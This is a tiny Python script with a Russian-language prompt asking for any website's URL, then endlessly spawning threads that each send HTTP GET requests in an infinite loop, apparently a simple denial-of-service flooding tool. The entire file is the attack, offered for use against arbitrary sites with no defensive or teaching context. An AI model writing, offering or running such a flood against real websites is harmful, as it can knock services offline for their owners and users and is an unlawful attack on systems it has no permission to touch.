# coding: utf8
import threading
import requests


print("Введите ссылку на любой сайт:")
url = input()

def dos():
 while True:
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()